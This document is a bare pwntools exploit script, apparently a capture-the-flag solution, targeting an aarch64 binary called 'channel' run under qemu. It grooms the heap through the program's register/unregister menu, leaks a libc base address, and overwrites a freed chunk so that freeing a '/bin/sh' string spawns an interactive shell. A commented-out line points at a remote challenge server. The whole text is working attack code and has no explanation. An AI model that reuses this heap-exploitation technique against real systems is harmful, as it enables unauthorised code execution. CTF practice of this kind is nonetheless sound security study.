#!/bin/sh

#coding:utf-8

from pwn import *

context.log_level='debug'
context.update(arch='arm64',os='linux',timeout=1)

#p=remote('123.60.218.64','23801')
#p=process(["./qemu-aarch64-static", "-g", "1234", "-L", "/usr/aarch64-linux-gnu",'./channel'])#debug
p=process(["./qemu-aarch64-static","-L", "/usr/aarch64-linux-gnu",'./channel'])#test
	
def register(key):
	p.sendlineafter("> ",str(1))
	p.sendafter("key> \n",str(key))

def unregister(key):
	p.sendlineafter("> ",str(2))
	p.sendafter("key> \n",str(key))
def pwnwread(key):
	p.sendlineafter("> ",str(3))
	p.sendafter("key> \n",str(key))
def pwnwrite(key,length,text):
	p.sendlineafter("> ",str(4))
	p.sendafter("key> \n",str(key))
	p.sendlineafter("len> \n",str(length))
	p.sendafter("content> \n",str(text))

 
for i in range(14):
	register(i)
for i in range(9):
	unregister(i)
for i in range(7):
	register(i)
unregister(13)
unregister(8)
pwnwrite(9,0x10,'a')
pwnwread(9)
libc_base=u64(p.recv(3).ljust(8,"\x00"))+0x4000000000-0x16dc62
log.success("libc_base==>"+hex(libc_base))
pwnwrite(9,0x1d0,'b'*0xd0+p64(0x0)+p64(0x121)+p64(libc_base+0x00000000016fc30))#9
register("/bin/sh\x00")
register(p64(libc_base+0x000000000040568))
unregister("/bin/sh\x00")
p.interactive()
	

